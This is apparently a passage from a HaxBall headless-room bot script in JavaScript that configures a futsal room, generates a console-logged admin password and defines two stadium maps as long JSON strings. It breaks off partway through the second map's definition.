// Stats: "Auth" : '["0-Games", "1-Wins", "2-Draws", "3-Losses", "4-Winrate", "5-Goals", "6-Assists", "7-GK", "8-CS", "9-CS%", "10-Role", "11-Nick"]'

/* VARIABLES */

/* ROOM */

const roomName = "⚽ Futsal | 1v1 2v2 3v3 ⚽";
const botName = "HaxBot";
const maxPlayers = 12;
const roomPublic = true;
const geo = [{"code": "DE", "lat": 51.1, "lon": 10.4}, {"code": "FR", "lat": 46.2, "lon": 2.2}, {"code": "PL", "lat": 51.9, "lon": 19.1}, {"code": "GB", "lat": 55.3, "lon": -3.4}, {"code": "PT", "lat": 39.3, "lon": -8.2}];

const room = HBInit({ roomName: roomName, maxPlayers: maxPlayers, public: roomPublic, playerName: botName, geo: geo[0] });

const scoreLimitClassic = 3;
const scoreLimitBig = 3;
const timeLimitClassic = 3;
const timeLimitBig = 3;

room.setTeamsLock(true);

var adminPassword = 1000 + getRandomInt(9000);
console.log("adminPassword : " + adminPassword);

/* STADIUM */

const playerRadius = 15;
var ballRadius = 10;
const triggerDistance = playerRadius + ballRadius + 0.01;
var aloneMap = '{"name":"Futsal Training from HaxMaps","width":600,"height":300,"spawnDistance":170,"bg":{"type":"hockey","width":500,"height":200,"kickOffRadius":75,"cornerRadius":0},"traits":{"ballArea":{"bCoef":1,"cMask":["ball"]},"kickOffBarrier":{"bCoef":0.1,"cGroup":["redKO","blueKO"],"cMask":["red","blue"]},"goalNet":{"bCoef":0.1,"cMask":["ball"]},"ballAreaS":{"vis":false,"bCoef":1,"cMask":["ball"]},"kickOffBarrierS":{"vis":false,"bCoef":0.1,"cGroup":["redKO","blueKO"],"cMask":["red","blue"]},"goalPost":{"radius":8,"invMass":0,"bCoef":0.5},"player":{"radius":15,"invMass":0,"bCoef":1}},"vertexes":[{"x":-500,"y":200,"trait":"ballArea","vis":false,"color":"FFFFFF"},{"x":-500,"y":-200,"trait":"ballArea","vis":false},{"x":500,"y":200,"trait":"ballArea","color":"FFFFFF"},{"x":500,"y":50,"cMask":["blue"],"cGroup":["blueKO"],"trait":"kickOffBarrier","curve":0,"_selected":"segment"},{"x":500,"y":-84,"cMask":["blue"],"cGroup":["blueKO"],"trait":"kickOffBarrier","curve":0,"_selected":"segment"},{"x":500,"y":-200,"trait":"ballArea"},{"x":0,"y":200,"trait":"kickOffBarrier","color":"FFFFFF"},{"x":0,"y":-200,"trait":"kickOffBarrier"},{"x":506,"y":-84,"trait":"goalNet","curve":0,"color":"FFFFFF"},{"x":545,"y":-84,"trait":"goalNet","curve":0,"color":"FFFFFF"},{"x":545,"y":50,"trait":"goalNet","curve":0,"color":"FFFFFF"},{"x":505,"y":50,"trait":"goalNet","curve":0,"color":"FFFFFF"},{"x":0,"y":-200,"bCoef":0.5,"color":"FFFFFF"},{"x":0,"y":75,"bCoef":0.5,"cMask":["blue"],"cGroup":["blueKO"],"trait":"kickOffBarrier","color":"FFFFFF","curve":180},{"x":0,"y":-75,"bCoef":0.5,"cMask":["blue"],"cGroup":["blueKO"],"trait":"kickOffBarrier","color":"FFFFFF","curve":180},{"x":0,"y":75,"bCoef":0.5,"cMask":["blueKO"],"color":"FFFFFF","curve":0},{"x":0,"y":-75,"bCoef":0.5,"cMask":["blueKO"],"color":"FFFFFF","curve":0},{"x":0,"y":75,"bCoef":0.5,"cMask":["blue"],"cGroup":["blueKO"],"trait":"kickOffBarrier","color":"FFFFFF","curve":-180},{"x":0,"y":-75,"bCoef":0.5,"cMask":["blue"],"cGroup":["blueKO"],"trait":"kickOffBarrier","color":"FFFFFF","curve":-180},{"x":-278,"y":141,"bCoef":0.5,"color":"CCFFFF","curve":30},{"x":0,"y":-75,"bCoef":0.5,"color":"FFFFFF","curve":180},{"x":-102,"y":141,"bCoef":0.5,"color":"CCFFFF","curve":30}],"segments":[{"v0":8,"v1":9,"curve":0,"color":"FFFFFF","trait":"goalNet"},{"v0":9,"v1":10,"color":"FFFFFF","trait":"goalNet"},{"v0":10,"v1":11,"curve":0,"color":"FFFFFF","trait":"goalNet"},{"v0":12,"v1":6,"curve":0,"color":"FFFFFF","bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"v0":2,"v1":0,"curve":0,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"v0":0,"v1":1,"curve":0,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"v0":1,"v1":5,"curve":0,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"v0":5,"v1":4,"curve":0,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"v0":3,"v1":2,"curve":0,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"v0":14,"v1":13,"curve":180,"color":"FFFFFF","bCoef":0.5,"cMask":["blue"],"cGroup":["blueKO"],"trait":"kickOffBarrier"},{"v0":16,"v1":15,"curve":0,"color":"FFFFFF","bCoef":0.5,"cMask":["blueKO"]},{"v0":3,"v1":4,"curve":0,"color":"FFFFFF","bCoef":0.5,"cMask":["blue"],"cGroup":["blueKO"],"trait":"kickOffBarrier","_selected":true},{"v0":18,"v1":17,"curve":-180,"color":"FFFFFF","bCoef":0.5,"cMask":["blue"],"cGroup":["blueKO"],"trait":"kickOffBarrier"}],"goals":[{"p0":[494,44],"p1":[494,-84],"team":"blue"}],"discs":[{"radius":5,"pos":[500,50],"color":"FFFFFF","trait":"goalPost"},{"radius":5,"pos":[500,-84],"color":"FFFFFF","trait":"goalPost"},{"pos":[-380,135],"color":"FFFFFF","trait":"player"},{"pos":[344,101],"color":"FFFFFF","trait":"player"},{"pos":[-380,-135],"color":"FFFFFF","trait":"player"},{"pos":[344,-120],"color":"FFFFFF","trait":"player"}],"planes":[],"ballPhysics":{"radius":6.5,"bCoef":0.4,"invMass":1.5,"damping":0.99,"color":"FFFFFF"},"playerPhysics":{"bCoef":0,"acceleration":0.11,"kickingAcceleration":0.083,"kickStrength":4.5}}'
var classicMap = '{"name":"Futsal x1, x2 [\u029c\u1d00x\u1d0d\u1d0f\u1d05s.\u1d04\u1d0f\u1d0d]","width":420,"height":200,"spawnDistance":180,"bg":{"type":"hockey","width":368,"height":171,"kickOffRadius":65,"cornerRadius":0},"vertexes":[{"x":-368,"y":171,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":-368,"y":65,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":-368,"y":-65,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":-368,"y":-171,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":368,"y":171,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":368,"y":65,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":368,"y":-65,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":368,"y":-171,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":0,"y":65,"trait":"kickOffBarrier"},{"x":0,"y":-65,"trait":"line"},{"x":368,"y":171,"bCoef":1,"trait":"ballArea"},{"x":368,"y":-171,"bCoef":1,"trait":"ballArea"},{"x":0,"y":171,"bCoef":0,"trait":"line"},{"x":0,"y":-171,"bCoef":0,"trait":"line"},{"x":0,"y":65,"trait":"kickOffBarrier"},{"x":0,"y":-65,"trait":"kickOffBarrier"},{"x":377,"y":-65,"bCoef":1,"cMask":["ball"],"trait":"line"},{"x":377,"y":-171,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":-377,"y":-65,"bCoef":1,"cMask":["ball"],"trait":"line"},{"x":-377,"y":-171,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":-377,"y":65,"bCoef":1,"cMask":["ball"],"trait":"line"},{"x":-377,"y":171,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":377,"y":65,"bCoef":1,"cMask":["ball"],"trait":"line"},{"x":377,"y":171,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":0,"y":199,"trait":"kickOffBarrier"},{"x":0,"y":65,"trait":"kickOffBarrier"},{"x":0,"y":-65,"trait":"kickOffBarrier"},{"x":0,"y":-199,"trait":"kickOffBarrier"},{"x":-368.53340356886,"y":-62.053454903872,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80]},{"x":-387.05760771891,"y":-63.053454903871994,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80]},{"x":-388.05760771891,"y":65.043361696331,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":-368.53340356886,"y":64.043361696331,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":368.09926357786,"y":63.94882446641,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80]},{"x":389,"y":64,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80],"_selected":true,"_data":{"mirror":[]}},{"x":390,"y":-61.927767991658,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":368.9681846993,"y":-62.144998272018,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":-368,"y":-142.37229643041,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":-260.90035258157,"y":-50.168480548544,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-368,"y":-160.81305960678,"bCoef":0.1,"trait":"line","curve":-90},{"x":-358.5379338963,"y":-171,"bCoef":0.1,"trait":"line","curve":-90},{"x":-368,"y":141.33175243687,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":-260.90035258157,"y":49.127936555002,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-368,"y":159.77251561324,"bCoef":0.1,"trait":"line","curve":90},{"x":-358.5379338963,"y":171,"bCoef":0.1,"trait":"line","curve":90},{"x":368,"y":159.77251561324,"bCoef":0.1,"trait":"line","curve":-90},{"x":358.36266315432,"y":171,"bCoef":0.1,"trait":"line","curve":-90},{"x":368,"y":-160.81305960678,"bCoef":0.1,"trait":"line","curve":90},{"x":358.36266315432,"y":-171,"bCoef":0.1,"trait":"line","curve":90},{"x":368,"y":-142.37229643041,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":260.72508183959,"y":-50.168480548544,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":368,"y":141.33175243687,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":260.72508183959,"y":49.127936555002,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":260.72508183959,"y":-50.168480548544,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":260.72508183959,"y":49.127936555002,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-250.86909422732,"y":-1.2295321189394,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":0.18898812539692,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":-2.6480523632758,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":1.6075083697333,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":0.89824824756514,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":-1.9387922411076,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":1.9621384308174,"bCoef":0.1,"trait":"line","curve":180},{"x":-250.86909422732,"y":-3.0026824243599,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":-1.2295321189394,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":0.18898812539692,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":-2.6480523632758,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":1.6075083697333,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":0.89824824756514,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":-1.9387922411076,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":1.9621384308174,"bCoef":0.1,"trait":"line","curve":180},{"x":250.69382348534,"y":-3.0026824243599,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":-1.2295321189394,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":0.18898812539692,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":-2.6480523632758,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":1.6075083697333,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":0.89824824756514,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":-1.9387922411076,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":1.9621384308174,"bCoef":0.1,"trait":"line","curve":180},{"x":-185.66591492467,"y":-3.0026824243599,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":-1.2295321189394,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":0.18898812539692,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":-2.6480523632758,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":1.6075083697333,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":0.89824824756514,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":-1.9387922411076,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":1.9621384308174,"bCoef":0.1,"trait":"line","curve":180},{"x":185.49064418269,"y":-3.0026824243599,"bCoef":0.1,"trait":"line","curve":180},{"x":-160.58776903904,"y":-159.39453936245,"bCoef":0.1,"trait":"line"},{"x":-160.58776903904,"y":-182.09086327183,"bCoef":0.1,"trait":"line"},{"x":-80.337702205015,"y":-159.39453936245,"bCoef":0.1,"trait":"line"},{"x":-80.337702205015,"y":-182.09086327183,"bCoef":0.1,"trait":"line"},{"x":160.41249829706,"y":-159.39453936245,"bCoef":0.1,"trait":"line"},{"x":160.41249829706,"y":-182.09086327183,"bCoef":0.1,"trait":"line"},{"x":80.162431463036,"y":-159.39453936245,"bCoef":0.1,"trait":"line"},{"x":80.162431463036,"y":-182.09086327183,"bCoef":0.1,"trait":"line"},{"x":-254.88159756902,"y":-171,"bCoef":0.1,"trait":"line"},{"x":-254.88159756902,"y":-182.09086327183,"bCoef":0.1,"trait":"line"},{"x":-371.91294503531,"y":-87.759267023458,"bCoef":0.1,"trait":"line"},{"x":-384.61920561736,"y":-87.759267023458,"bCoef":0.1,"trait":"line"},{"x":371.73767429333,"y":-87.759267023458,"bCoef":0.1,"trait":"line"},{"x":384.44393487538,"y":-87.759267023458,"bCoef":0.1,"trait":"line"},{"x":-371.91294503531,"y":86.718723029916,"bCoef":0.1,"trait":"line"},{"x":-384.61920561736,"y":86.718723029916,"bCoef":0.1,"trait":"line"},{"x":371.73767429333,"y":86.718723029916,"bCoef":0.1,"trait":"line"},{"x":384.44393487538,"y":86.718723029916,"bCoef":0.1,"trait":"line"},{"x":-254.88159756902,"y":171,"bCoef":0.1,"trait":"line"},{"x":-254.88159756902,"y":181.05031927829,"bCoef":0.1,"trait":"line"},{"x":254.70632682704,"y":-171,"bCoef":0.1,"trait":"line"},{"x":254.70632682704,"y":-182.09086327183,"bCoef":0.1,"trait":"line"},{"x":254.70632682704,"y":171,"bCoef":0.1,"trait":"line"},{"x":254.70632682704,"y":181.05031927829,"bCoef":0.1,"trait":"line"},{"x":377,"y":-65,"bCoef":1,"cMask":["ball"],"trait":"line"},{"x":377,"y":-171,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":-377,"y":-65,"bCoef":1,"cMask":["ball"],"trait":"line"},{"x":-377,"y":-171,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":-377,"y":65,"bCoef":1,"cMask":["ball"],"trait":"line"},{"x":-377,"y":171,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":377,"y":65,"bCoef":1,"cMask":["ball"],"trait":"line"},{"x":377,"y":171,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":371,"y":-65,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":371,"y":-171,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":371,"y":65,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":371,"y":171,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":-371,"y":65,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":-371,"y":171,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":-371,"y":-65,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":-371,"y":-171,"bCoef":0,"cMask":["ball"],"trait":"ballArea"}],"segments":[{"v0":0,"v1":1,"trait":"ballArea"},{"v0":2,"v1":3,"trait":"ballArea"},{"v0":4,"v1":5,"trait":"ballArea"},{"v0":6,"v1":7,"trait":"ballArea"},{"v0":8,"v1":9,"curve":180,"cGroup":["blueKO"],"trait":"kickOffBarrier"},{"v0":8,"v1":9,"curve":-180,"cGroup":["redKO"],"trait":"kickOffBarrier"},{"v0":1,"v1":0,"vis":true,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":-368},{"v0":5,"v1":4,"vis":true,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":368},{"v0":2,"v1":3,"vis":true,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":-368},{"v0":6,"v1":7,"vis":true,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":368},{"v0":0,"v1":10,"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","y":171},{"v0":3,"v1":11,"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","y":-171},{"v0":12,"v1":13,"curve":0,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line"},{"v0":9,"v1":8,"curve":-180,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line"},{"v0":15,"v1":14,"curve":180,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line"},{"v0":2,"v1":1,"curve":0,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line"},{"v0":6,"v1":5,"curve":0,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line"},{"v0":16,"v1":17,"vis":false,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":330},{"v0":18,"v1":19,"vis":false,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":-330},{"v0":20,"v1":21,"vis":false,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":-330},{"v0":22,"v1":23,"vis":false,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":330},{"v0":24,"v1":25,"trait":"kickOffBarrier"},{"v0":26,"v1":27,"trait":"kickOffBarrier"},{"v0":28,"v1":29,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,-80],"y":-80},{"v0":29,"v1":30,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","x":-590},{"v0":30,"v1":31,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,80],"y":80},{"v0":32,"v1":33,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,-80],"y":-80},{"v0":33,"v1":34,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","x":-590},{"v0":34,"v1":35,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,80],"y":80},{"v0":36,"v1":37,"curve":94.0263701017,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":39,"v1":38,"curve":86.632306418889,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":40,"v1":41,"curve":-94.026370101699,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":37,"v1":41,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":43,"v1":42,"curve":-86.632306418888,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":45,"v1":44,"curve":86.632306418884,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":47,"v1":46,"curve":-86.632306418899,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":48,"v1":49,"curve":-94.026370101699,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":50,"v1":51,"curve":94.026370101699,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":52,"v1":53,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":390},{"v0":55,"v1":54,"curve":-180.00692920292,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":54,"v1":55,"curve":-180.00218240614,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":57,"v1":56,"curve":-179.64823645332,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":56,"v1":57,"curve":-180.35758668147,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":59,"v1":58,"curve":-180.02357323962,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":58,"v1":59,"curve":-180.00924102399,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":61,"v1":60,"curve":-180.06885755885,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":60,"v1":61,"curve":-180.02948353257,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":63,"v1":62,"curve":-179.99869069543,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":62,"v1":63,"curve":-179.99939258776,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":65,"v1":64,"curve":-180.08826047163,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":64,"v1":65,"curve":-179.91186753664,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":67,"v1":66,"curve":-179.99528711105,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":66,"v1":67,"curve":-179.99743836358,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":69,"v1":68,"curve":-179.98626041101,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":68,"v1":69,"curve":-179.99175181595,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":71,"v1":70,"curve":-180.04715562398,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":70,"v1":71,"curve":-179.95294709391,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":73,"v1":72,"curve":-179.95715750564,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":72,"v1":73,"curve":-179.89943871875,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":75,"v1":74,"curve":-179.94773754738,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":74,"v1":75,"curve":-179.98221351296,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":77,"v1":76,"curve":-180.4151727218,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":76,"v1":77,"curve":-179.58764458796,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":79,"v1":78,"curve":-180.00086646359,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":78,"v1":79,"curve":-180.01965986376,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":81,"v1":80,"curve":-180.03532601389,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":80,"v1":81,"curve":-179.99380079,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":83,"v1":82,"curve":-180.0044468452,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":82,"v1":83,"curve":-180.01386779847,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":85,"v1":84,"curve":-180.05158287563,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":84,"v1":85,"curve":-180.01212223878,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":86,"v1":87,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240},{"v0":88,"v1":89,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-120},{"v0":90,"v1":91,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":240},{"v0":92,"v1":93,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":120},{"v0":94,"v1":95,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-381},{"v0":96,"v1":97,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":123},{"v0":98,"v1":99,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":123},{"v0":100,"v1":101,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":-123},{"v0":102,"v1":103,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":-123},{"v0":104,"v1":105,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-381},{"v0":106,"v1":107,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":381},{"v0":108,"v1":109,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":381},{"v0":110,"v1":111,"vis":false,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":330},{"v0":112,"v1":113,"vis":false,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":-330},{"v0":114,"v1":115,"vis":false,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":-330},{"v0":116,"v1":117,"vis":false,"color":"FFFFFF","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":330},{"v0":118,"v1":119,"vis":false,"color":"FFFFFF","bCoef":0,"cMask":["ball"],"trait":"ballArea","x":371},{"v0":120,"v1":121,"vis":false,"color":"FFFFFF","bCoef":0,"cMask":["ball"],"trait":"ballArea","x":371},{"v0":122,"v1":123,"vis":false,"color":"FFFFFF","bCoef":0,"cMask":["ball"],"trait":"ballArea","x":-371},{"v0":124,"v1":125,"vis":false,"color":"FFFFFF","bCoef":0,"cMask":["ball"],"trait":"ballArea","x":-371}],"goals":[{"p0":[-374.25,-62.053454903872],"p1":[-374.25,64.043361696331],"team":"red"},{"p0":[374.25,62],"p1":[374.25,-62],"team":"blue"}],"discs":[{"radius":3.9405255187564,"pos":[-368.53340356886,64.043361696331],"color":"6666CC","trait":"goalPost","y":80},{"radius":3.9405255187564,"pos":[-368.53340356886,-62.053454903872],"color":"6666CC","trait":"goalPost","y":-80,"x":-560},{"radius":3.9405255187564,"pos":[368.9681846993,-62.144998272018],"color":"6666CC","trait":"goalPost","y":80},{"radius":3.9405255187564,"pos":[368.09926357786,63.94882446641],"color":"6666CC","trait":"goalPost","y":-80,"x":-560},{"radius":3,"invMass":0,"pos":[-368,-171],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[-368,171],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[368,171],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[368,-171],"color":"FFCC00","bCoef":0.1,"trait":"line"}],"planes":[{"normal":[0,1],"dist":-171,"trait":"ballArea","_data":{"extremes":{"normal":[0,1],"dist":-171,"canvas_rect":[-901,-304,901,304],"a":[-901,-171],"b":[901,-171]}}},{"normal":[0,-1],"dist":-171,"trait":"ballArea","_data":{"extremes":{"normal":[0,-1],"dist":-171,"canvas_rect":[-901,-304,901,304],"a":[-901,171],"b":[901,171]}}},{"normal":[0,1],"dist":-200,"bCoef":0.2,"cMask":["all"],"_data":{"extremes":{"normal":[0,1],"dist":-200,"canvas_rect":[-901,-304,901,304],"a":[-901,-200],"b":[901,-200]}}},{"normal":[0,-1],"dist":-200,"bCoef":0.2,"cMask":["all"],"_data":{"extremes":{"normal":[0,-1],"dist":-200,"canvas_rect":[-901,-304,901,304],"a":[-901,200],"b":[901,200]}}},{"normal":[1,0],"dist":-420,"bCoef":0.2,"cMask":["all"],"_data":{"extremes":{"normal":[1,0],"dist":-420,"canvas_rect":[-901,-304,901,304],"a":[-420,-304],"b":[-420,304]}}},{"normal":[-1,0],"dist":-420,"bCoef":0.2,"cMask":["all"],"_data":{"extremes":{"normal":[-1,0],"dist":-420,"canvas_rect":[-9